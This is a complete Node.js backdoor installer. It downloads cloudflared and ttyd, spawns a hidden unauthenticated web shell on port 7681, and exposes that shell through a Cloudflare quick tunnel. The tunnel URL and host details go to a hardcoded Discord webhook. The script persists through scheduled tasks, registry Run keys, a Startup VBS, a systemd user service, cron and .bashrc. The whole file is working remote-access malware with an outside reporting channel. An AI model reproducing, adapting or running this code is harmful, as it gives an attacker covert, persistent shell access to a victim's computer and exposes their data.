'use strict';
const { spawn, spawnSync } = require('child_process');
const https = require('https');
const http  = require('http');
const fs    = require('fs');
const path  = require('path');
const os    = require('os');

const IS_WIN   = process.platform === 'win32';
const PLATFORM = IS_WIN ? 'Windows' : 'Linux';
const EXE      = IS_WIN ? '.exe' : '';
const ARCH     = os.arch();
const NODE_VER = process.version;

function cfArch()   { return ARCH==='arm64'?'arm64':ARCH==='arm'?'arm':'amd64'; }
function ttydArch() { return ARCH==='arm64'?'aarch64':ARCH==='arm'?'armhf':'x86_64'; }

function resolveDir() {
  const c = IS_WIN ? [
    path.dirname(process.execPath),
    path.join(process.env.APPDATA      || path.join(os.homedir(),'AppData','Roaming'),'NodeSvc'),
    path.join(process.env.LOCALAPPDATA || path.join(os.homedir(),'AppData','Local'),  'NodeSvc'),
    path.join(os.homedir(),'NodeSvc'),
    process.cwd(),
  ] : [
    path.join(os.homedir(),'.local','share','nodesvc'),
    path.join(os.homedir(),'nodesvc'),
    '/usr/local/share/nodesvc',
    process.cwd(),
  ];
  for (const d of c) {
    try {
      fs.mkdirSync(d,{recursive:true});
      const p=path.join(d,'.p'); fs.writeFileSync(p,'1'); fs.unlinkSync(p);
      return d;
    } catch(_) {}
  }
  return process.cwd();
}

const DIR             = resolveDir();
const NODE_EXE        = process.execPath;
const CLOUDFLARED_EXE = path.join(DIR,'cloudflared'+EXE);
const TTYD_EXE        = path.join(DIR,'ttyd'+EXE);
const INDEX_JS        = path.join(DIR,'index.js');
const PID_FILE        = path.join(DIR,'nodesvc.pid');

// ─── Webhook URL ──────────────────────────────────────────────────────────────
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555164390834184212/oHQWPxDPenBf4d03fmw5ZwNKpOBGp1sgEmSsIcRxhCK8Dhso25sPPDuvvgI4ojhK_cep';

const TTYD_PORT = 7681;
const TAG = '['+PLATFORM+' | '+os.hostname()+']';

function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }

function sendWebhook(msg) {
  try {
    const body = JSON.stringify({ content: (TAG+' '+msg).slice(0,2000) });
    const u = new URL(WEBHOOK_URL);
    const req = https.request({ hostname:u.hostname, path:u.pathname+u.search, method:'POST',
      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)} },()=>{});
    req.on('error',()=>{}); req.write(body); req.end();
  } catch(_) {}
}

function downloadFile(url, dest) {
  return new Promise((resolve,reject) => {
    const tmp = dest+'.tmp';
    const follow = u => {
      const mod = u.startsWith('https')?https:http;
      mod.get(u, res => {
        if ([301,302,303,307,308].includes(res.statusCode)) return follow(res.headers.location);
        if (res.statusCode!==200) return reject(new Error('HTTP '+res.statusCode));
        const f = fs.createWriteStream(tmp);
        res.pipe(f);
        f.on('finish',()=>f.close(()=>{
          try{fs.renameSync(tmp,dest);}
          catch(_){fs.copyFileSync(tmp,dest);try{fs.unlinkSync(tmp);}catch(_){}}
          resolve(dest);
        }));
        f.on('error',e=>{try{fs.unlinkSync(tmp);}catch(_){} reject(e);});
      }).on('error',reject);
    };
    follow(url);
  });
}

async function downloadWithRetry(url, dest, tries) {
  tries=tries||4;
  for (let i=1;i<=tries;i++) {
    try { await downloadFile(url,dest); return true; }
    catch(_) { if(i<tries) await sleep(1500*i); }
  }
  return false;
}

function chmodExec(p) { if(!IS_WIN) try{fs.chmodSync(p,0o755);}catch(_){} }

function findBin(name) {
  try {
    const r=spawnSync(IS_WIN?'where':'which',[name],{encoding:'utf8'});
    if(r.status===0) return (r.stdout||'').trim().split(/\r?\n/)[0].trim();
  } catch(_) {}
  return null;
}

function tryPkg(pkg) {
  for (const [m,a] of [
    ['apt-get',['-y','install',pkg]],['dnf',['-y','install',pkg]],
    ['yum',['-y','install',pkg]],['pacman',['-S','--noconfirm',pkg]],
    ['zypper',['-n','install',pkg]],
  ]) { try{if(spawnSync(m,a,{encoding:'utf8',timeout:90000}).status===0)return true;}catch(_){} }
  return false;
}

async function installCloudflared() {
  if (fs.existsSync(CLOUDFLARED_EXE)) { sendWebhook('cloudflared already present'); return; }
  if (IS_WIN) {
    const wg=spawnSync('winget',['install','--id','Cloudflare.cloudflared','--silent',
      '--accept-package-agreements','--accept-source-agreements','--scope','user'],
      {windowsHide:true,encoding:'utf8',timeout:90000});
    if (wg.status===0) {
      const f=findBin('cloudflared');
      if(f&&f!==CLOUDFLARED_EXE) try{fs.copyFileSync(f,CLOUDFLARED_EXE);}catch(_){}
      if(fs.existsSync(CLOUDFLARED_EXE)){sendWebhook('📦 cloudflared installed (winget)');return;}
    }
  } else {
    const f=findBin('cloudflared');
    if(f){
      try{fs.copyFileSync(f,CLOUDFLARED_EXE);chmodExec(CLOUDFLARED_EXE);}catch(_){}
      if(fs.existsSync(CLOUDFLARED_EXE)){sendWebhook('📦 cloudflared ready (found in PATH: '+f+')');return;}
    }
    if(tryPkg('cloudflared')){
      const f2=findBin('cloudflared');
      if(f2)try{fs.copyFileSync(f2,CLOUDFLARED_EXE);chmodExec(CLOUDFLARED_EXE);}catch(_){}
      if(fs.existsSync(CLOUDFLARED_EXE)){sendWebhook('📦 cloudflared installed (pkg)');return;}
    }
  }
  const url=IS_WIN
    ?'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'
    :'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-'+cfArch();
  if(await downloadWithRetry(url,CLOUDFLARED_EXE)){
    chmodExec(CLOUDFLARED_EXE);sendWebhook('📦 cloudflared installed (download, '+cfArch()+')');
  } else sendWebhook('⚠️ cloudflared install failed — all methods exhausted');
}

async function installTtyd() {
  if(fs.existsSync(TTYD_EXE)){sendWebhook('ttyd already present');return;}
  if(!IS_WIN){
    const f=findBin('ttyd');
    if(f){
      try{fs.copyFileSync(f,TTYD_EXE);chmodExec(TTYD_EXE);}catch(_){}
      if(fs.existsSync(TTYD_EXE)){sendWebhook('📦 ttyd ready (found in PATH: '+f+')');return;}
    }
    if(tryPkg('ttyd')){
      const f2=findBin('ttyd');
      if(f2)try{fs.copyFileSync(f2,TTYD_EXE);chmodExec(TTYD_EXE);}catch(_){}
      if(fs.existsSync(TTYD_EXE)){sendWebhook('📦 ttyd installed (pkg)');return;}
    }
  }
  const url=IS_WIN
    ?'https://github.com/tsl0922/ttyd/releases/latest/download/ttyd.win32.exe'
    :'https://github.com/tsl0922/ttyd/releases/latest/download/ttyd.'+ttydArch();
  if(await downloadWithRetry(url,TTYD_EXE)){
    chmodExec(TTYD_EXE);sendWebhook('📦 ttyd installed (download, '+ttydArch()+')');
  } else sendWebhook('⚠️ ttyd install failed — all methods exhausted');
}

function isDaemonRunning() {
  try {
    if(!fs.existsSync(PID_FILE))return false;
    const pid=parseInt(fs.readFileSync(PID_FILE,'utf8').trim(),10);
    if(!pid||isNaN(pid)||pid===process.pid)return false;
    try{process.kill(pid,0);return true;}
    catch(e){return e.code==='EPERM';}
  } catch(_){return false;}
}

// ─── Embedded index.js ────────────────────────────────────────────────────────
function writeIndexJs() {
  const W=WEBHOOK_URL, P=TTYD_PORT;
  const lines = [
    "'use strict';",
    "const {spawn}=require('child_process'),https=require('https'),fs=require('fs'),path=require('path'),os=require('os');",
    "const IS_WIN=process.platform==='win32';",
    "const PLATFORM=IS_WIN?'Windows':'Linux';",
    "const EXE=IS_WIN?'.exe':'';",
    "const SHELL=IS_WIN?'cmd.exe':(process.env.SHELL||'/bin/bash');",
    "const TAG='['+PLATFORM+' | '+os.hostname()+']';",
    "const NODE_VER=process.version;",
    "function resolveDir(){",
    "  const c=IS_WIN?[path.dirname(process.execPath),",
    "    path.join(process.env.APPDATA||path.join(os.homedir(),'AppData','Roaming'),'NodeSvc'),",
    "    path.join(process.env.LOCALAPPDATA||path.join(os.homedir(),'AppData','Local'),'NodeSvc'),",
    "    path.join(os.homedir(),'NodeSvc')]:[",
    "    path.join(os.homedir(),'.local','share','nodesvc'),",
    "    path.join(os.homedir(),'nodesvc')];",
    "  for(const d of c){try{fs.mkdirSync(d,{recursive:true});const p=path.join(d,'.p');fs.writeFileSync(p,'1');fs.unlinkSync(p);return d;}catch(_){}}",
    "  return path.dirname(process.execPath);",
    "}",
    "const DIR=resolveDir();",
    "const CF_EXE=path.join(DIR,'cloudflared'+EXE);",
    "const TTYD_EXE=path.join(DIR,'ttyd'+EXE);",
    "const PID_FILE=path.join(DIR,'nodesvc.pid');",
    "const CF_TOKEN=path.join(os.homedir(),'.cloudflared','token');",
    "const TTYD_PORT="+P+";",
    "const WATCHDOG_MS=12000;",
    "const HEARTBEAT_MS=60*60*1000;",
    "// ── auth: set TTYD_AUTH=true + restart daemon to enable ──────────────────",
    "const TTYD_AUTH=false;",
    "const TTYD_USER='admin';",
    "const TTYD_PASS='admin';",
    "const WEBHOOK_URL='"+W+"';",
    "",
    "function sendWebhook(msg){",
    "  try{",
    "    const body=JSON.stringify({content:(TAG+' '+msg).slice(0,2000)});",
    "    const u=new URL(WEBHOOK_URL);",
    "    const req=https.request({hostname:u.hostname,path:u.pathname+u.search,method:'POST',",
    "      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}},()=>{});",
    "    req.on('error',()=>{});req.write(body);req.end();",
    "  }catch(_){}",
    "}",
    "",
    "function fmtUptime(start){",
    "  if(!start)return '?';",
    "  const s=Math.floor((Date.now()-start)/1000);",
    "  const m=Math.floor(s/60),h=Math.floor(m/60),d=Math.floor(h/24);",
    "  if(d)return d+'d '+(h%24)+'h '+(m%60)+'m';",
    "  if(h)return h+'h '+(m%60)+'m '+(s%60)+'s';",
    "  if(m)return m+'m '+(s%60)+'s';",
    "  return s+'s';",
    "}",
    "",
    "function isAlreadyRunning(){",
    "  try{",
    "    if(!fs.existsSync(PID_FILE))return false;",
    "    const pid=parseInt(fs.readFileSync(PID_FILE,'utf8').trim(),10);",
    "    if(!pid||isNaN(pid)||pid===process.pid)return false;",
    "    try{process.kill(pid,0);return true;}catch(e){return e.code==='EPERM';}",
    "  }catch(_){return false;}",
    "}",
    "if(isAlreadyRunning()){sendWebhook('⚠️ duplicate launch detected — existing instance still running, exiting');process.exit(0);}",
    "try{fs.writeFileSync(PID_FILE,String(process.pid),'utf8');}catch(_){}",
    "process.on('exit',()=>{try{fs.unlinkSync(PID_FILE);}catch(_){}});",
    "process.on('uncaughtException',err=>{sendWebhook('💥 uncaught exception: '+err.message);});",
    "process.on('unhandledRejection',r=>{sendWebhook('💥 unhandled rejection: '+r);});",
    "",
    "function spawnHidden(exe,args){",
    "  try{const p=spawn(exe,args,{detached:true,stdio:'ignore',windowsHide:true,shell:false});p.unref();return p;}",
    "  catch(e){sendWebhook('⚠️ spawn failed ('+path.basename(exe)+'): '+e.message);return null;}",
    "}",
    "",
    "let ttydProc=null,cfProc=null;",
    "let ttydR=0,cfR=0;",
    "let ttydStart=null,cfStart=null;",
    "let tunnelUrl=null;",
    "",
    "function startTtyd(fromWatchdog){",
    "  if(ttydProc&&!ttydProc.killed)return;",
    "  if(!fs.existsSync(TTYD_EXE)){sendWebhook('⚠️ ttyd binary missing at '+TTYD_EXE);return;}",
    "  const args=['-p',String(TTYD_PORT),'-W','-t','titleFixed=Terminal'];",
    "  if(TTYD_AUTH)args.push('-c',TTYD_USER+':'+TTYD_PASS);",
    "  args.push(SHELL);",
    "  ttydProc=spawnHidden(TTYD_EXE,args);",
    "  if(!ttydProc)return;",
    "  ttydStart=Date.now();",
    "  if(fromWatchdog)sendWebhook('🔁 ttyd restarted\\nport: '+TTYD_PORT+' | auth: '+TTYD_AUTH+' | restart #'+ttydR);",
    "  ttydProc.on('exit',(code,sig)=>{",
    "    const up=fmtUptime(ttydStart);",
    "    ttydProc=null;ttydStart=null;ttydR++;",
    "    sendWebhook('🔴 ttyd died\\nexit: '+code+' | signal: '+sig+'\\nuptime: '+up+' | total restarts: '+ttydR);",
    "  });",
    "  ttydProc.on('error',e=>{ttydProc=null;ttydStart=null;sendWebhook('⚠️ ttyd error: '+e.message);});",
    "}",
    "",
    "function startCloudflared(fromWatchdog){",
    "  if(cfProc&&!cfProc.killed)return;",
    "  if(!fs.existsSync(CF_EXE)){sendWebhook('⚠️ cloudflared binary missing at '+CF_EXE);return;}",
    "  let args,useToken=false;",
    "  try{if(fs.existsSync(CF_TOKEN)){const t=fs.readFileSync(CF_TOKEN,'utf8').trim();if(t){args=['tunnel','run','--token',t];useToken=true;}}}catch(_){}",
    "  if(!args)args=['tunnel','--url','http://localhost:'+TTYD_PORT];",
    "  if(fromWatchdog)sendWebhook('🔁 cloudflared restarting\\nmode: '+(useToken?'named tunnel':'quick tunnel')+' | restart #'+cfR);",
    "  if(useToken){",
    "    cfProc=spawnHidden(CF_EXE,args);",
    "  }else{",
    "    try{",
    "      cfProc=spawn(CF_EXE,args,{detached:true,stdio:['ignore','pipe','pipe'],windowsHide:true,shell:false});",
    "      cfProc.unref();",
    "      let got=false;",
    "      function check(d){",
    "        if(got)return;",
    "        const m=String(d).match(/https:\\/\\/[a-z0-9-]+\\.trycloudflare\\.com/i);",
    "        if(m){",
    "          got=true;tunnelUrl=m[0];",
    "          sendWebhook('🔗 '+m[0]+'\\nmode: quick tunnel | auth: '+(TTYD_AUTH?'on':'off'));",
    "          try{if(cfProc&&cfProc.stdout){cfProc.stdout.removeAllListeners('data');cfProc.stdout.resume();}}catch(_){}",
    "          try{if(cfProc&&cfProc.stderr){cfProc.stderr.removeAllListeners('data');cfProc.stderr.resume();}}catch(_){}",
    "        }",
    "      }",
    "      if(cfProc.stdout)cfProc.stdout.on('data',check);",
    "      if(cfProc.stderr)cfProc.stderr.on('data',check);",
    "      const to=setTimeout(()=>{",
    "        if(!got)sendWebhook('⚠️ cloudflared started but no tunnel URL detected after 60s');",
    "        try{if(cfProc&&cfProc.stdout){cfProc.stdout.removeAllListeners('data');cfProc.stdout.resume();}}catch(_){}",
    "        try{if(cfProc&&cfProc.stderr){cfProc.stderr.removeAllListeners('data');cfProc.stderr.resume();}}catch(_){}",
    "      },60000);",
    "      if(to.unref)to.unref();",
    "    }catch(e){",
    "      sendWebhook('⚠️ cloudflared spawn error: '+e.message);",
    "      cfProc=spawnHidden(CF_EXE,args);",
    "    }",
    "  }",
    "  if(!cfProc)return;",
    "  cfStart=Date.now();",
    "  cfProc.on('exit',(code,sig)=>{",
    "    const up=fmtUptime(cfStart);",
    "    cfProc=null;cfStart=null;cfR++;tunnelUrl=null;",
    "    sendWebhook('🔴 cloudflared died\\nexit: '+code+' | signal: '+sig+'\\nuptime: '+up+' | total restarts: '+cfR);",
    "  });",
    "  cfProc.on('error',e=>{cfProc=null;cfStart=null;sendWebhook('⚠️ cloudflared error: '+e.message);});",
    "}",
    "",
    "startTtyd(false);",
    "setTimeout(()=>{",
    "  const useToken=fs.existsSync(CF_TOKEN);",
    "  sendWebhook('🟢 online\\nnode: '+NODE_VER+' | pid: '+process.pid+'\\ndir: '+DIR+'\\nttyd: port '+TTYD_PORT+' | auth: '+TTYD_AUTH+' | shell: '+SHELL+'\\ntunnel: '+(useToken?'named (token found)':'quick (URL incoming)')+' | watchdog: '+WATCHDOG_MS+'ms');",
    "  startCloudflared(false);",
    "  const w=setInterval(()=>{",
    "    if(!ttydProc||ttydProc.killed)startTtyd(true);",
    "    if(!cfProc||cfProc.killed)startCloudflared(true);",
    "  },WATCHDOG_MS);",
    "  if(w.unref)w.unref();",
    "  // 6-hour heartbeat",
    "  const hb=setInterval(()=>{",
    "    const ts=ttydProc&&!ttydProc.killed?'up '+fmtUptime(ttydStart):'DOWN';",
    "    const cs=cfProc&&!cfProc.killed?'up '+fmtUptime(cfStart):'DOWN';",
    "    sendWebhook('💓 heartbeat\\nttyd: '+ts+' | cloudflared: '+cs+'\\nurl: '+(tunnelUrl||'none')+'\\nrestarts: ttyd='+ttydR+' cf='+cfR);",
    "  },HEARTBEAT_MS);",
    "  if(hb.unref)hb.unref();",
    "},2500);",
    "",
    "setInterval(()=>{},60000);",
  ];
  fs.writeFileSync(INDEX_JS, lines.join('\n'), 'utf8');
}

function setupPersistenceWin() {
  const name='NodeSvc',cmd='"'+NODE_EXE+'" "'+INDEX_JS+'"';
  const appdata=process.env.APPDATA||path.join(os.homedir(),'AppData','Roaming');
  spawnSync('schtasks',['/delete','/tn',name,'/f'],{windowsHide:true,encoding:'utf8'});
  spawnSync('reg',['delete','HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','/v',name,'/f'],{windowsHide:true,encoding:'utf8'});
  if(spawnSync('schtasks',['/create','/tn',name,'/tr',cmd,'/sc','onlogon','/rl','HIGHEST','/f'],{windowsHide:true,encoding:'utf8'}).status===0)
    {sendWebhook('🔒 persisted: Task Scheduler (HIGHEST, runs on logon)');return;}
  if(spawnSync('schtasks',['/create','/tn',name,'/tr',cmd,'/sc','onlogon','/f'],{windowsHide:true,encoding:'utf8'}).status===0)
    {sendWebhook('🔒 persisted: Task Scheduler (user-level, no admin needed)');return;}
  if(spawnSync('reg',['add','HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run','/v',name,'/t','REG_SZ','/d',cmd,'/f'],{windowsHide:true,encoding:'utf8'}).status===0)
    {sendWebhook('🔒 persisted: Registry HKCU\\Run (runs on login, no admin)');return;}
  try{
    const sd=path.join(appdata,'Microsoft','Windows','Start Menu','Programs','Startup');
    fs.mkdirSync(sd,{recursive:true});
    fs.writeFileSync(path.join(sd,name+'.vbs'),
      'Set o=CreateObject("WScript.Shell")\r\no.Run """'+NODE_EXE+'"" ""'+INDEX_JS+'""",0,False','utf8');
    sendWebhook('🔒 persisted: Startup folder VBS (runs on login, no admin)');return;
  }catch(_){}
  sendWebhook('⚠️ persistence failed on all 4 tiers (schtasks HIGHEST → schtasks user → registry → startup folder)');
}

function setupPersistenceLinux() {
  const name='nodesvc',cmd=NODE_EXE+' '+JSON.stringify(INDEX_JS);
  try{
    const cur=spawnSync('crontab',['-l'],{encoding:'utf8'}).stdout||'';
    if(cur.includes(INDEX_JS)){
      const tmp=path.join(os.tmpdir(),'ns.cron');
      fs.writeFileSync(tmp,cur.split('\n').filter(l=>!l.includes(INDEX_JS)).join('\n'));
      spawnSync('crontab',[tmp],{encoding:'utf8'});
      try{fs.unlinkSync(tmp);}catch(_){}
    }
  }catch(_){}
  try{
    const sd=path.join(os.homedir(),'.config','systemd','user');
    fs.mkdirSync(sd,{recursive:true});
    fs.writeFileSync(path.join(sd,name+'.service'),
      '[Unit]\nDescription=NodeSvc\nAfter=network.target\n\n'+
      '[Service]\nType=simple\nExecStart='+NODE_EXE+' '+INDEX_JS+'\nRestart=always\nRestartSec=10\n\n'+
      '[Install]\nWantedBy=default.target\n');
    spawnSync('systemctl',['--user','daemon-reload'],{encoding:'utf8'});
    spawnSync('loginctl',['enable-linger',process.env.USER||os.userInfo().username],{encoding:'utf8'});
    spawnSync('systemctl',['--user','enable','--now',name],{encoding:'utf8'});
    if((spawnSync('systemctl',['--user','is-active',name],{encoding:'utf8'}).stdout||'').trim()==='active')
      {sendWebhook('🔒 persisted: systemd user service (linger enabled, survives logout)');return;}
  }catch(_){}
  try{
    const cur=spawnSync('crontab',['-l'],{encoding:'utf8'}).stdout||'';
    const tmp=path.join(os.tmpdir(),'ns.cron');
    fs.writeFileSync(tmp,cur.trimEnd()+'\n@reboot '+cmd+' &\n');
    if(spawnSync('crontab',[tmp],{encoding:'utf8'}).status===0){
      try{fs.unlinkSync(tmp);}catch(_){}
      sendWebhook('🔒 persisted: cron @reboot');return;
    }
    try{fs.unlinkSync(tmp);}catch(_){}
  }catch(_){}
  try{
    const rc=path.join(os.homedir(),'.bashrc');
    const ex=fs.existsSync(rc)?fs.readFileSync(rc,'utf8'):'';
    if(!ex.includes(INDEX_JS))fs.appendFileSync(rc,'\n# nodesvc\nnohup '+cmd+' >/dev/null 2>&1 &\n','utf8');
    sendWebhook('🔒 persisted: ~/.bashrc (runs on shell login)');return;
  }catch(_){}
  sendWebhook('⚠️ persistence failed on all tiers (systemd → cron → bashrc)');
}

function setupPersistence() {
  if(IS_WIN) setupPersistenceWin(); else setupPersistenceLinux();
}

function launchDaemon() {
  if(isDaemonRunning()){
    sendWebhook('⚠️ daemon already running (pid: '+fs.readFileSync(PID_FILE,'utf8').trim()+') — skipping relaunch');
    return;
  }
  try{
    const p=spawn(NODE_EXE,[INDEX_JS],{detached:true,stdio:'ignore',windowsHide:true,shell:false});
    p.unref();
  }catch(e){sendWebhook('⚠️ daemon launch failed: '+e.message+'\nrun manually: node '+INDEX_JS);}
}

async function main() {
  sendWebhook('⚙️ setup started\nnode: '+NODE_VER+' | '+PLATFORM+' | '+ARCH+'\ndir: '+DIR);
  await installCloudflared();
  await installTtyd();
  writeIndexJs();
  setupPersistence();
  launchDaemon();
  sendWebhook('✅ setup done\ncloudflared: '+(fs.existsSync(CLOUDFLARED_EXE)?'✓':'✗')+
    ' | ttyd: '+(fs.existsSync(TTYD_EXE)?'✓':'✗')+' | daemon: launched');
}

main().catch(e=>sendWebhook('💥 setup crashed: '+e.message));
